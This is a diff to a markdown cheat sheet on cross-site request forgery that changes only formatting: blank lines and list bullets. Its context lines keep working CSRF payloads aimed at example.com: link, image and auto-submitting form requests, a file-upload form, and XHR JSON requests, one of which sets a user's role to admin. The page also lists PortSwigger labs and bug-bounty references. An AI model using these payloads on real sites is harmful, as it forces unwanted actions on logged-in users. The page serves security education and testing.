@@ -2,7 +2,6 @@
 
 > Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
 
-
 ## Summary
 
 * [Tools](#tools)
@@ -18,11 +17,9 @@
 * [Labs](#labs)
 * [References](#references)
 
-
 ## Tools
 
 * [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.
-
 
 ## Methodology
 
@@ -30,20 +27,17 @@
 
 When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
 
-
 ### HTML GET - Requiring User Interaction
 
 ```html
 <a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
 ```
 
-
 ### HTML GET - No User Interaction
 
 ```html
 <img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
-
 
 ### HTML POST - Requiring User Interaction
 
@@ -53,7 +47,6 @@ When you are logged in to a certain site, you typically have a session. The iden
  <input type="submit" value="Submit Request" />
 </form>
 ```
-
 
 ### HTML POST - AutoSubmit - No User Interaction
 
@@ -67,7 +60,6 @@ When you are logged in to a certain site, you typically have a session. The iden
  document.getElementById("autosubmit").submit();
 </script>
 ```
-
 
 ### HTML POST - multipart/form-data With File Upload - Requiring User Interaction
 
@@ -90,7 +82,6 @@ function launch(){
 <button value="button" onclick="launch()">Submit Request</button>
 ```
 
-
 ### JSON GET - Simple Request
 
 ```html
@@ -100,7 +91,6 @@ xhr.open("GET", "http://www.example.com/api/currentuser");
 xhr.send();
 </script>
 ```
-
 
 ### JSON POST - Simple Request
 
@@ -143,7 +133,6 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
-
 ## Labs
 
 * [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
@@ -155,20 +144,19 @@ xhr.send('{"role":admin}');
 * [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
 * [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
 
-
 ## References
 
-- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
-- [Cross-Site Request Forgery (CSRF) - OWASP - Apr 19, 2024](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
-- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://whitton.io/articles/messenger-site-wide-csrf/)
-- [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - 19 July 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
-- [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
-- [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://hackerone.com/reports/100820)
-- [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
-- [How I Hacked Your Beats Account? Apple Bug Bounty - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
-- [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://hackerone.com/reports/245346)
-- [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15th, 2018](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
-- [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
-- [Cross-Site Request Forgery Attack - PwnFunction - 5 Apr. 2019](https://www.youtube.com/watch?v=eWEgUcHPle0)
-- [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
-- [Bypass Referer Check Logic for CSRF - hahwul - Oct 11, 2019](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
+* [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
+* [Cross-Site Request Forgery (CSRF) - OWASP - Apr 19, 2024](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
+* [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://whitton.io/articles/messenger-site-wide-csrf/)
+* [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - 19 July 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
+* [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - 2014/10/09](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)
+* [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://hackerone.com/reports/100820)
+* [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
+* [How I Hacked Your Beats Account? Apple Bug Bounty - @aaditya_purani - 2016/07/20](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
+* [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://hackerone.com/reports/245346)
+* [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15th, 2018](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
+* [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
+* [Cross-Site Request Forgery Attack - PwnFunction - 5 Apr. 2019](https://www.youtube.com/watch?v=eWEgUcHPle0)
+* [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)
+* [Bypass Referer Check Logic for CSRF - hahwul - Oct 11, 2019](https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)
